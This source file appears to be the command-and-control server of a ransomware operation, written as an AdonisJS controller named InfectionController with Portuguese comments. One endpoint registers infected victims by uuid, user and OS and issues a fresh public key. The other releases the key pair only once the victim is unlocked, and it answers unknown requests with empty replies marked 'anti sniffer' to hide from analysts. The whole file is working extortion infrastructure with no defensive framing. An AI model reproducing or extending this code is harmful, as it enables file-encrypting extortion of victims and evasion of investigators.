'use strict'

const Client = use('App/Models/Client')
const KeyPair = use('App/Models/KeyPair')
const { generateKeyPair } = use('App/Helpers')

class InfectionController {

    async infection({ request, response}){
        const { uuid, infection, user, os } = request.all()
        try {
            var client = await Client.findBy('uuid', uuid)
            if(client){
                const clientKeyPair = await KeyPair.findBy('client_id',client.id )
                const payload = {}
                payload.publicKey = clientKeyPair.publicKey
                return response.status(201).send(payload)
            
            }

            client = await Client.create({
                uuid, 
                infection, 
                user, 
                os
            })

            var parChaves = generateKeyPair();
            parChaves = await KeyPair.create({
                ...parChaves,
                client_id: client.id
            })
            return response.status(201).send({ publicKey: parChaves.publicKey })

        } catch (error) {
            return response.status(204).send()
        }
    }

    async check({ request, response }){
        const uuid = request.input('uuid')

        if(!uuid){
            //anti sniffer
            return response.status(204).send()
        }

        //busca por uuid no BD
        var client = await Client.query().with('keyPair').where('uuid', uuid).first()

        if(!client){
            //anti sniffer
            return response.status(204).send()
        }

        client = client.toJSON()

        //verifica s epode ser desbloqueada

        if(!client.locked){ 
            return response.status(200).send(client.keyPair)
        }

        // se nao puder desbloquear
        return response.status(204).send()


    }
}



module.exports = InfectionController
